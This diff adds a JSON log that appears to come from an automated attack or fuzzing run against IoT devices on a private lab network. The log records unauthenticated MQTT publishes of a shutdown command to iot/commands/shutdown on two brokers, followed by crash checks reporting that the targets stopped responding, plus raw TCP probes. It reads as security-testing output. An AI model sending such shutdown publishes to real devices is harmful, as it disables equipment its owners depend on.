@@ -1,0 +1,315 @@
+[
+  {
+    "timestamp": 1773699019.8047755,
+    "target_ip": "192.168.100.100",
+    "target_arch": "Unknown",
+    "tool_used": "tcp_send",
+    "payload_hex": "474554202f20485454502f312e310d0a486f73743a203139322e3136382e3130302e3130300d0a0d0a",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "474554202f20485454502f312e310d0a486f73743a203139322e3136382e3130302e3130300d0a0d0a",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5022,
+      "details": "No response within timeout"
+    }
+  },
+  {
+    "timestamp": 1773699082.9068398,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 3
+    }
+  },
+  {
+    "timestamp": 1773699089.6781683,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.47:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 7
+    }
+  },
+  {
+    "timestamp": 1773699116.914663,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 6
+    }
+  },
+  {
+    "timestamp": 1773699122.9631817,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  },
+  {
+    "timestamp": 1773699148.3042114,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.47:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 2
+    }
+  },
+  {
+    "timestamp": 1773699168.9317722,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 3
+    }
+  },
+  {
+    "timestamp": 1773699190.9819567,
+    "target_ip": "192.168.100.47",
+    "target_arch": "Unknown",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "crash_verified",
+    "details": {
+      "status": "crashed",
+      "verified": true,
+      "ip": "192.168.100.47",
+      "details": "Ping OK but all probed ports [502, 4242, 5683] unresponsive",
+      "vulnerability_id": "bae2c537cf87"
+    }
+  },
+  {
+    "timestamp": 1773699218.514117,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 4
+    }
+  },
+  {
+    "timestamp": 1773699236.9216542,
+    "target_ip": "192.168.100.47",
+    "target_arch": "Unknown",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "crash_verified",
+    "details": {
+      "status": "crashed",
+      "verified": true,
+      "ip": "192.168.100.47",
+      "details": "Ping OK but all probed ports [502, 4242, 5683] unresponsive",
+      "vulnerability_id": "9f456a7b5348"
+    }
+  },
+  {
+    "timestamp": 1773699276.657085,
+    "target_ip": "192.168.100.47",
+    "target_arch": "unknown",
+    "tool_used": "replay_probe",
+    "payload_hex": "7b 22 61 63 74 69 6f 6e 22 3a 22 73 68 75 74 64 6f 77 6e 22 7d",
+    "packets_sent": 1,
+    "outcome": "replay_delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 104] Connection reset by peer",
+      "sent_hex": "7b22616374696f6e223a2273687574646f776e227d"
+    }
+  },
+  {
+    "timestamp": 1773699299.9723303,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 3
+    }
+  },
+  {
+    "timestamp": 1773699307.2673032,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.47:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 7
+    }
+  },
+  {
+    "timestamp": 1773699319.9847386,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 3
+    }
+  },
+  {
+    "timestamp": 1773699342.309987,
+    "target_ip": "192.168.100.47",
+    "target_arch": "Unknown",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "crash_verified",
+    "details": {
+      "status": "crashed",
+      "verified": true,
+      "ip": "192.168.100.47",
+      "details": "Ping OK but all probed ports [502, 4242, 5683] unresponsive",
+      "vulnerability_id": "83dc060e97b7"
+    }
+  },
+  {
+    "timestamp": 1773699343.3320918,
+    "target_ip": "192.168.100.20",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.20:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 2
+    }
+  },
+  {
+    "timestamp": 1773699384.986527,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 3
+    }
+  },
+  {
+    "timestamp": 1773699390.0414534,
+    "target_ip": "192.168.100.47",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.47:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 4
+    }
+  },
+  {
+    "timestamp": 1773699408.1302805,
+    "target_ip": "192.168.100.47",
+    "target_arch": "Unknown",
+    "tool_used": "tcp_send",
+    "payload_hex": "101600044d5154540400003c000a746573745f73756273",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "101600044d5154540400003c000a746573745f73756273",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 5014,
+      "details": "No response within timeout"
+    }
+  }
+]
